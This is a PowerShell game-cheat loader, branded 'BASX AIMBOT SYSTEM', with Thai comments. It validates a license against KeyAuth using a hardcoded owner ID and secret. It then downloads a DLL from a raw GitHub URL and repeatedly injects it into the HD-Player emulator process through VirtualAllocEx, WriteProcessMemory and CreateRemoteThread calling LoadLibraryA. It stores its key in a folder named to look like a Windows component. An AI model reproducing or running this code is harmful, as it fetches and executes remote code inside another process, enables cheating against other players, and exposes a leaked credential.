[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- ข้อมูล KeyAuth ---
$Name    = "Relaxwtf777's Application"
$OwnerID = "W404AorT6U"
$Secret  = "bdd0ab6c75599fffdb5ad43d22a82fe8bf8fa0fbd92dfdfbb2df80dc6d105d38"
$Version = "1.0"

# พาธสำหรับเก็บข้อมูล
$dirPath    = "$env:LOCALAPPDATA\WindowsHealth"
$configPath = "$dirPath\auth.dat"
$targetDll  = "$env:TEMP\AimbotFemaleFix.dll"
$dllUrl     = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/refs/heads/main/winsky.dll"
$targetProc = "HD-Player"

function Show-Auth {
    param($savedKey = $null)
    Clear-Host
    Write-Host "==============================" -ForegroundColor Cyan
    Write-Host "     BASX AIMBOT SYSTEM       " -ForegroundColor Cyan
    Write-Host "==============================" -ForegroundColor Cyan
    
    $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
    try {
        $initRes = Invoke-RestMethod -Uri $initUrl -Method Get
        if ($initRes.success -ne $true) { return $null }
        $sessionId = $initRes.sessionid
    } catch { return $null }

    # ถ้าไม่มีคีย์เก่า ให้ถามใหม่ ถ้ามีแล้วให้ใช้คีย์เดิม
    if ($null -ne $savedKey) { 
        $key = $savedKey 
        Write-Host "[*] Using saved license key..." -ForegroundColor Gray
    } else { 
        $key = Read-Host " Enter License Key" 
    }

    $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
    $loginUrl = "https://keyauth.win/api/1.2/?type=license&key=$key&hwid=$hwid&sessionid=$sessionId&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID"
    
    try {
        $loginRes = Invoke-RestMethod -Uri $loginUrl -Method Get
        if ($loginRes.success -eq $true) {
            if (!(Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force }
            $key | Out-File $configPath -Force
            return $true
        }
    } catch { }
    return $false
}

# ตรวจสอบว่าเคยใส่คีย์ไว้หรือยัง
$currentKey = $null
if (Test-Path $configPath) { $currentKey = Get-Content $configPath }

if (Show-Auth -savedKey $currentKey) {
    Write-Host "[+] Login Success!" -ForegroundColor Green

    # ดาวน์โหลดไฟล์ (เปลี่ยนชื่อปลายทางเป็น AimbotFemaleFix.dll)
    Write-Host "[*] Downloading components..." -ForegroundColor Yellow
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($dllUrl, $targetDll)
    } catch { 
        Write-Host "[!] Download Failed." -ForegroundColor Red
        exit 
    }

    $Source = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Diagnostics;
    using System.Text;
    public class NodeHandler {
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dw, bool b, int p);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lp);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h, string pName);
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint pr);
        [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
        [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr h, IntPtr a, byte[] b, int s, out int r);
        [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr at, uint st, IntPtr sr, IntPtr pa, uint f, IntPtr id);
        
        public static void StartNode(string path, int pid) {
            IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)path.Length + 1, 0x3000, 0x40);
            IntPtr outSize;
            WriteProcessMemory(hProc, addr, Encoding.Default.GetBytes(path), (uint)path.Length + 1, out outSize);
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }

        public static bool CheckMemory(int pid, long addr) {
            IntPtr h = OpenProcess(0x001F0FFF, false, pid);
            byte[] b = new byte[4];
            int r;
            if (ReadProcessMemory(h, (IntPtr)addr, b, 4, out r)) {
                return b[0] == 0xFF && b[1] == 0xFF; // ตรวจสอบค่าล็อคหัว
            }
            return false;
        }
    }
"@
    Add-Type -TypeDefinition $Source

    # ระบบตรวจสอบและฉีดอัตโนมัติ (รันวนลูปเบื้องหลัง)
    Write-Host "[*] System is monitoring $targetProc..." -ForegroundColor Cyan
    while ($true) {
        $p = Get-Process $targetProc -ErrorAction SilentlyContinue
        if ($p) {
            # ตรวจสอบค่าที่ 0x2EC ถ้าค่าไม่ล็อค ให้ฉีดใหม่
            if (![NodeHandler]::CheckMemory($p.Id, 0x2EC)) {
                if (Test-Path $targetDll) {
                    [NodeHandler]::StartNode($targetDll, $p.Id)
                    Write-Host "[+] AimbotFemaleFix Injected Automatically!" -ForegroundColor Green
                }
            }
        }
        Start-Sleep -Seconds 10 # เช็คทุก 10 วินาทีเพื่อความเสถียร
    }
} else {
    Write-Host "[-] Authentication Failed. Please check your key." -ForegroundColor Red
    if (Test-Path $configPath) { Remove-Item $configPath } # ลบคีย์ที่ผิดทิ้ง
}
